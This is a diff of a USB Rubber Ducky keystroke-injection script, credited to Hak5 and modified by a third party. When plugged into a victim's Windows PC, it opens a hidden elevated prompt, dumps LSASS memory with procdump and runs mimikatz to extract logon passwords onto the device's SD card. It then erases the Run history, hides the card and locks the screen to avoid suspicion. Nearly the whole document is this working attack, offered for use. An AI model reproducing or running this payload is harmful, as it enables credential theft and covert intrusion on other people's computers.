@@ -1,10 +1,12 @@
 REM Title: Invoke mimikatz and save passwords to the rubber ducky SD. You must download the files we need for have it ready for the attack: **NECESARY TWIN DUCK**
 REM Author: Hak5Darren Props: Mubix, Clymb3r, Gentilkiwi. MODIFIED BY 4LON3LY0
 REM 
-REM The next two lines are because a twin duck rubber ducky is detected by the computer, and normally it open the explorer in the USB, for not have that problem when all is beeing executed, we wait until it is opened and we close it. 
+REM Add 100 for each gb of your micro SD card. The default is 200 because normally the rubber ducky is used with 4Gb micro SDs.
+DELAY 200
+REM The next two lines are because a twin duck rubber ducky is detected by the computer as a normal USB drive, and normally it open the file explorer in the USB, for not have that problem when all is being executed, we wait until it is opened and we close it. If your victim has not it configured to open the file explorer when a new USB device is plugged on or is a machine without any GUI, for example, a server, comment or remove the next two lines.
 DELAY 3500
 ALT F4
-REM Open an admin command prompt 
+REM Open an admin command prompt, for non-GUI machines is not necessary because only have a command prompt
 GUI r
 DELAY 500
 STRING powershell Start-Process cmd -Verb runAs
@@ -12,28 +14,31 @@ ENTER
 DELAY 2000
 ALT y
 DELAY 1000
-REM Obfuscate the command prompt
+REM The next 3 lines will obfuscate the command prompt, as mentioned above, for machines without GUI is unnecesary.
 STRING mode con:cols=18 lines=1
 ENTER
 STRING color FE
 ENTER
-REM Invoke Mimikatz with lsass.dmp and save the results
+REM Create a dump file
+REM Change D: by the letter that will be assigned to the twin duck drive. If you are not sure, leave it on D:, is very common to mount USB drives with that letter. 
 STRING D:
 ENTER
 STRING procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ENTER
-DELAY 20000
+REM the time depends of the machine, some take 1 second and some 10, I will choose 5.
+DELAY 5000
+REM Invoke Mimikatz with lsass.dmp and save the results.
 STRING mimikatz # sekurlsa::minidump lsass.dmp
 ENTER
 DELAY 1000
 STRING mimikatz # sekurlsa::logonPasswords full
 ENTER
 DELAY 20000
-REM Clear the Run history
+REM Clear the command history
 STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
 ENTER
-DELAY 50
-REM We unmount de SD card for be unaccesible from de computer if somebody catch us (you can mount in your computer after the attack with 'mountvol D: (and here your volume id, you can know it with the command 'mountvol')'.
+DELAY 100
+REM We unmount de SD card for having it hidden if somebody catch us (you can mount it in your computer after the attack with 'mountvol D: (and here your volume uuid, you can know it with the command 'mountvol')'.
 REM Change this "\\?\Volume{aab583e5-447d-11ea-8e8d-b4a9fc03eb69}\" with your volume id, you can know it with the command 'mountvol'.
 STRING mountvol \\?\Volume{VOLUME_UUID}\ /p
 ENTER
@@ -41,6 +46,7 @@ DELAY 100
 REM After the unmount, we will not need the command prompt more, so we close it.
 STRING exit
 ENTER
-REM We block the computer so we’re less suspicious. You can remove it if you think that it is unnecesary.
+REM We block the computer so we’re less suspicious. You can remove or comment it if you think that it is unnecesary or as mentioned above, a machine with no GUI like a server.
 GUI L
 REM Plug off the ducky and extract the micro SD. You will have there the extracted passwords.
+REM Enjoy.
